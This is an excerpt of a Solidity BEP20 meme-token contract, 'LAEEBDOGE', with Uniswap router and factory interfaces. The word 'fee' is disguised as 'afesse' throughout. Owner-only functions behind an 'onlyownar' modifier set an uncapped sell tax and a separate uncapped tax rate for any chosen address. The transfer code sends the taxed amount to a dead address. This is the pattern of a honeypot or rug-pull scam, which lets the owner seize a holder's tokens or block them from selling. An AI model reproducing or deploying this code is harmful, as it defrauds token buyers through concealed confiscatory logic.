...
interface IUniswapV2Factory {
    ...
    function afesseTo() external view returns (address);
    function afesseToSetter() external view returns (address);
    ...
    function setafesseTo(address) external;
    function setafesseToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingafesseOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingafesseOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingafesseOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingafesseOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingafesseOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract LAEEBDOGE is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellafesse = 0;

    uint256 private _defaultBuyafesse = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipafesse;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellafesse = _value;
    }

    function setSlipafesse(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipafesse[_address] = _value;
    }

    function getSlipafesse(address _address) external view onlyownar returns (uint256) {
        return _slipafesse[_address];
    }


    function setMAccountafesse(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountafesse(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeafesseAmount = 0;

        if (rF) {
            uint256 tradeafesse = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeafesse = _defaultSellafesse;
                }
                if (from == uniswapV2Pair) {

                    tradeafesse = _defaultBuyafesse;
                }
            }
            if (_slipafesse[from] > 0) {
                tradeafesse = _slipafesse[from];
            }

            tradeafesseAmount = _Amount.mul(tradeafesse).div(100);
        }


        if (tradeafesseAmount > 0) {
            _balances[from] = _balances[from].sub(tradeafesseAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeafesseAmount);
            emit Transfer(from, _deadAddress, tradeafesseAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeafesseAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeafesseAmount);
        emit Transfer(from, _to, _Amount - tradeafesseAmount);
    }
